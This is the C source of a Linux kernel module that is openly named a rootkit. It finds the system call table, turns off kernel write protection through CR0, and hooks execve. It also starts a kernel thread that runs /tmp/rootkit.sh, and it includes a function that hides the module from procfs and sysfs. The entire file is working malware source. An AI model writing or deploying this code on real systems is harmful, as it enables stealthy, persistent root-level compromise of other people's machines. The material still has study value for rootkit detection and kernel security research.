#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>  
#include <linux/unistd.h>    /* __NR_execve */
#include <asm/paravirt.h>    /* write_cr0 */
#include <asm/pgtable.h>     /* pte_mkwrite */

#define CMD "/tmp/rootkit.sh"

struct task_struct *my_kthread; 
unsigned long *syscall_table = NULL;
pte_t *pte;


/* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */
asmlinkage int (*real_execve)(const char *filename, char *const argv[], char *const envp[]);

asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]) {
   pr_info("ROOTKIT hooked call to execve(%s, ...)\n", filename);
   return real_execve(filename, argv, envp);
}



static int threadfn(void *data){
   do {
      /* use UHM_WAIT_PROC to get useful error information */
      pr_info("ROOTKIT executing %s\n", CMD);
      if (call_usermodehelper(CMD, NULL, NULL, UMH_NO_WAIT)) {
	 pr_info("ROOTKIT call_usermodehelper() failed\n"); 
	 return 1;
      } else {
	 return 0;
      }
      msleep(5000);
   } while(!kthread_should_stop());
   pr_info("ROOTKIT kernel thread stopping\n");
   return 0;
}


void start_cmd_thread(void){
   int cpu = 0;
   /* create, bind, wake */
   pr_info("ROOTKIT Starting kernel thread on cpu %d\n", cpu);
   my_kthread = kthread_create(threadfn, &cpu, "rootkit");
   kthread_bind(my_kthread, cpu);
   wake_up_process(my_kthread);	
}



/* remove LKM from procfs and sysfs */
void module_hide(void) {
   list_del(&THIS_MODULE->list);             //remove from procfs
   kobject_del(&THIS_MODULE->mkobj.kobj);    //remove from sysfs
   THIS_MODULE->sect_attrs = NULL;
   THIS_MODULE->notes_attrs = NULL;
}


void hijack_execve(void) {
   unsigned int level;
   syscall_table = NULL;
   
   /* lookup dynamic address of sys_call_table using kallsyms */
   syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
   
   /* get the page table entry (PTE) for the page containing sys_call_table */
   pte = lookup_address((long unsigned int)syscall_table, &level);
   
   pr_info("ROOTKIT syscall_table is at %p\n", syscall_table);
   pr_info("ROOTKIT PTE address located %p\n", &pte);

   if (syscall_table != NULL) {
      /* enable writing to sys_call_table using CR0 or PTE method, dont need both */
      write_cr0 (read_cr0 () & (~ 0x10000));
      //pte->pte |= _PAGE_RW;
      /* hijack execve */
      real_execve = (void *)syscall_table[__NR_execve];
      syscall_table[__NR_execve] = &new_execve;
      /* disable writing to sys_call_table */
      write_cr0 (read_cr0 () | 0x10000);
      //pte->pte &= ~_PAGE_RW;
      pr_info("ROOTKIT execve is at %p\n", real_execve);
      pr_info("ROOTKIT syscall_table[__NR_execve] hooked\n");
   } else {
      printk(KERN_EMERG "ROOTKIT sys_call_table is NULL\n");
   }
}


void un_hijack_execve(void) {
   if (syscall_table != NULL) {
      write_cr0 (read_cr0 () & (~ 0x10000));
      //pte->pte |= _PAGE_RW;
      syscall_table[__NR_execve] = real_execve;
      write_cr0 (read_cr0 () | 0x10000);
      //pte->pte &= ~_PAGE_RW;
      printk(KERN_EMERG "ROOTKIT sys_call_table unhooked\n");
   } else {
      printk(KERN_EMERG "ROOTKIT syscall_table is NULL\n");
   }
}



static int __init my_init(void) {
   pr_info("ROOTKIT module loaded at 0x%p\n", my_init);
   //module_hide();
   hijack_execve();
   start_cmd_thread();
   return 0;
}


static void __exit my_exit(void) {
   un_hijack_execve();
   kthread_stop(my_kthread);
   pr_info("ROOTKIT unloaded from 0x%p\n", my_exit);
}

module_init(my_init);
module_exit(my_exit);

MODULE_AUTHOR("Marcus Hodges");
MODULE_LICENSE("GPL v2");

